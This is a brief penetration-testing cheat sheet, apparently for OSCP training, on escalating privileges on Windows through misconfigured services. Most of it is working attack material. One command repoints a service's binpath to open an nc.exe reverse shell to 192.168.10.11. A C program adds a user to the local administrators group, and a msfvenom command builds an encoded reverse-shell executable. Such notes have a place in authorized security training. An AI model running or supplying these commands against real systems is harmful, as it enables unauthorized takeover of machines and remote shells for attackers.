# Weak Services

## Abuse service via BinPath

Search for a services which are running under priviliaged account, then use the following command with accesschk.exe to verify if our current user has permission to modify its settings:

```
C:\> accesschk.exe -wuvc myservice
```

Look for the “SERVICE_CHANGE_CONFIG” in the response. Then use the following command to execute net user instend of service bin:

```
C:\> sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 192.168.10.11 1234 -e C:\WINDOWS\System32\cmd.exe"
```

## Abuse service via Unquoted Paths

For more detailed technique: https://github.com/RootInj3c/OSCP-PwK/blob/master/Windows/Unquoted_Paths.md


## Appendix - Creating malicous services

### Manully using C

Using the following code:

```
#include <stdlib.h>
int main ()
{
    int i;
    i = system("net localgroup administrators theusername /add");
    return 0;
}
```

Compile it using Kali:

```
root@kali:~/# nano adduser.c
root@kali:~/# i686-w64-mingw32-gcc adduser.c -lws2_32 -o exp.exe
```

### Using Metasploit

Execute the following command to get pre-compiled malicous binary:

```
root@kali:~/# msfvenom -p windows/shell/reverse_tcp LHOST=192.168.10.11 LPORT=443 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe
```



